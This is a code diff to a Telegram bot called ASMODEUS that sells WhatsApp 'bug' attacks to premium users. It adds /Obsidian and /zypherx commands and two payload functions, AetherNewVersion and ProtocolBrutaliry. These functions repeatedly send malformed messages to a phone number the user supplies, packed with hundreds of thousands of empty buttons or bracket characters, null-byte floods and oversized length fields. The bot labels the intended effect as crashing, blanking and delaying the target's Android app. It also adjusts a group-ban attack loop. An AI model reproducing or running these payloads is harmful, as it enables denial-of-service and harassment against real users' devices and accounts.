@@ -34,6 +34,8 @@ function isAttackCancelled(token) {
 }
 
 const ATTACK_FEATURES = {
+  obsidian:  { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  zypherx:   { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
   xspecter:  { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
   xbugs:     { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
   xkill:     { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
@@ -360,7 +362,7 @@ Status: Connected`;
 ⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
 ⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
 ⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
-⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
+⢸⣿⣿⏣⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
 ⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
 ⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
 ⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
@@ -641,6 +643,8 @@ bot.action("holee", async (ctx) => {
     .table(
       [
         ["Commands", "Effect"],
+        ["/Obsidian", "𝘾𝙍𝘼𝙎𝙃 𝙭 𝘽𝙇𝘼𝙉𝙆 𝙭 𝘿𝙀𝙇𝘼𝙔"],
+        ["/zypherx", "CRASH HOME X DELAY"],
         ["/xspecter", "CRASH INVISIBLE ANDROID"],
         ["/xbugs", "INVISIBLE DELAY ANDRO"],
         ["/xkill", "INVISIBLE DELAY ANDRO"],
@@ -1765,6 +1769,174 @@ bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
   }
 });
 
+bot.command("Obsidian", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /Obsidian 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  if (ctx.chat.type === 'private') {
+    const DRAFT_ID = 99;
+    await ctx.sendRichMessageDraft(
+      DRAFT_ID,
+      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
+    );
+  }
+
+  const richContent = new HTML()
+    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
+    .divider()
+    .table(
+      [
+        ["Info", "Detail"],
+        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
+        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "𝘾𝙍𝘼𝙎𝙃 𝙭 𝘽𝙇𝘼𝙉𝙆 𝙭 𝘿𝙀𝙇𝘼𝙔"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .taskList(
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.obsidian.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.obsidian.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.obsidian.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.obsidian.antiKenon }
+    )
+    .divider()
+    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+    .build();
+
+  await ctx.sendRichMessage(richContent, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+      ]
+    }
+  });
+
+  if (typeof sock === "undefined" || !sock) {
+    return await ctx.sendRichMessage(
+      new HTML()
+        .heading(2, "⚠️ Gagal Mengirim")
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
+        .build()
+    );
+  }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 5; i++) {
+          if (shouldStop()) return;
+          await ProtocolBrutaliry(sock, target);
+          if (shouldStop()) return;
+          await sleep(1000);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
+});
+
+bot.command("zypherx", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /zypherx 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  if (ctx.chat.type === 'private') {
+    const DRAFT_ID = 99;
+    await ctx.sendRichMessageDraft(
+      DRAFT_ID,
+      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
+    );
+  }
+
+  const richContent = new HTML()
+    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
+    .divider()
+    .table(
+      [
+        ["Info", "Detail"],
+        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
+        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "CRASH HOME X DELAY"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .taskList(
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.zypherx.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.zypherx.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.zypherx.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.zypherx.antiKenon }
+    )
+    .divider()
+    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+    .build();
+
+  await ctx.sendRichMessage(richContent, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+      ]
+    }
+  });
+
+  if (typeof sock === "undefined" || !sock) {
+    return await ctx.sendRichMessage(
+      new HTML()
+        .heading(2, "⚠️ Gagal Mengirim")
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
+        .build()
+    );
+  }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 30; i++) {
+          if (shouldStop()) return;
+          await AetherNewVersion(sock, target);
+          if (shouldStop()) return;
+          await CrashNew(sock, target);
+          if (shouldStop()) return;
+          await sleep(1500);
+          if (shouldStop()) return;
+          await sleep(2000);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
+});
+
 bot.command("xspecter", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply("🪧 ⚠️ Example : /xspecter 62xx");
@@ -2322,7 +2494,7 @@ bot.command("bannidoV3", checkPremiumOrGroupPremium, checkWhatsAppConnection, as
       [
         ["Info", "Detail"],
         [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${shortJid}`],
-        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("4956233646441760046", "⏳") + " Status", "Joining..."],
         [HTML.customEmoji("5425077563577890102", "👥") + " Platform", "GROUP"],
         [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "BAN GB NEW TEST"]
       ],
@@ -2361,13 +2533,48 @@ bot.command("bannidoV3", checkPremiumOrGroupPremium, checkWhatsAppConnection, as
       const token = startAttack();
       const shouldStop = () => isAttackCancelled(token);
       try {
-        for (let i = 0; i < 100; i++) {
+        for (let i = 0; i < 50; i++) {
           if (shouldStop()) return;
           await BanGbTry(sock, groupJid);
           if (shouldStop()) return;
           const delay = i % 2 === 0 ? 2000 : 2500;
           await sleep(delay);
         }
+        if (shouldStop()) return;
+
+        const successCard = new HTML()
+          .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+          .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+          .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " ✅ Success! Nomor 13135550002 ditambahkan")
+          .divider()
+          .table(
+            [
+              ["Info", "Detail"],
+              [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${shortJid}`],
+              [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+              [HTML.customEmoji("5425077563577890102", "👥") + " Platform", "GROUP"],
+              [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "BAN GB NEW TEST"]
+            ],
+            { bordered: true, striped: true, hasHeader: true }
+          )
+          .divider()
+          .taskList(
+            { text: "Invisible Hard", checked: ATTACK_FEATURES.bannidoV3.invisibleHard },
+            { text: "Bug Gacor", checked: ATTACK_FEATURES.bannidoV3.bugGacor },
+            { text: "Bebas Spam", checked: ATTACK_FEATURES.bannidoV3.bebasSpam },
+            { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.bannidoV3.antiKenon }
+          )
+          .divider()
+          .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+          .build();
+
+        await ctx.sendRichMessage(successCard, {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "TARGET", url: `https://chat.whatsapp.com/${matchInvite ? matchInvite[1] : cleanJid}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+            ]
+          }
+        });
       } catch (error) {
         if (!shouldStop()) {
           await ctx.sendRichMessage(
@@ -2916,6 +3123,133 @@ async function CrashNew(sock, target) {
 
         await sock.relayMessage(target, msg, MakLo);
     }
+}
+
+/* AetherNewVersion (zypherx) */
+async function AetherNewVersion(sock, target) {
+    const recipient = target.includes('@') ? target : target + '@s.whatsapp.net';
+
+    const payloads = [
+        "placeholderResendMessage",
+        Buffer.from("placeholderResendMessage").toString("base64"),
+        Buffer.from(
+            Buffer.from("placeholderResendMessage").toString("base64")
+        ).toString("base64"),
+        Array.from("placeholderResendMessage").map(c => c.charCodeAt(0)),
+        Array.from("placeholderResendMessage").map(c => c.charCodeAt(0) ^ 0x42),
+        Array.from("placeholderResendMessage").map(c => c.charCodeAt(0) ^ 0xFF),
+        Buffer.from(
+            Array.from("placeholderResendMessage").map(c => c.charCodeAt(0) ^ 0x5A)
+        ).toString("base64")
+    ];
+
+    const data = Buffer.from(JSON.stringify({
+        response_id: crypto.randomUUID(),
+        sections: []
+    })).toString("base64");
+
+    const idx = Math.floor(Math.random() * payloads.length);
+
+    const memek = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "\u200B" + "\u927D"
+                    },
+                    header: {
+                        title: "\u200D"
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: JSON.stringify({
+                            placeholderResendMessage: payloads[idx]
+                        }),
+                        buttons: Array.from({ length: 500550 }, () => ({}))
+                    },
+                    nativeFlowResponseMessage: {
+                        buttons: [
+                            { name: "meta_ai_message" }
+                        ]
+                    }
+                }
+            }
+        }
+    };
+
+    const memek2 = {
+        botForwardedMessage: {
+            message: {
+                richResponseMessage: {
+                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
+                    submessages: [
+                        {
+                            messageType: "AI_RICH_RESPONSE_TABLE",
+                            tableMetadata: {
+                                rows: [{}],
+                                title: "makluwmati"
+                            }
+                        }
+                    ],
+                    unifiedResponse: {
+                        data: data
+                    },
+                    contextInfo: {
+                        isForwarded: true,
+                        forwardOrigin: "META_AI"
+                    }
+                }
+            }
+        }
+    };
+
+    try {
+        await sock.relayMessage(recipient, memek, { noSelfSync: true });
+        await sock.relayMessage(recipient, memek2, { noSelfSync: true });
+    } catch (_) {}
+}
+
+/* ProtocolBrutaliry (Obsidian) */
+async function ProtocolBrutaliry(sock, target) {
+  for (let i = 0; i < 100; i++) {
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              header: {
+                imageMessage: {
+                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+                  mimetype: "image/jpeg",
+                  caption: "AmbaNih?",
+                  fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
+                  fileLength: "537689",
+                  height: 1000,
+                  width: 1000,
+                  mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
+                  fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb3Xn0+0A=",
+                  directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+                  mediaKeyTimestamp: "1782643133",
+                  jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
+                  hasMediaAttachment: true,
+                  scanLengths: [9999999999, 9999999999, 9999999999, 9999999999]
+                }
+              },
+              body: {
+                text: "@vixzzofc" + "\u0000".repeat(10000)
+              },
+              nativeFlowMessage: {
+                buttons: "[".repeat(500000)
+              }
+            }
+          }
+        }
+      },
+      { noSelfSync: true }
+    );
+
+    await new Promise(r => setTimeout(r, 1000));
+  }
 }
 
 /* End Bug */
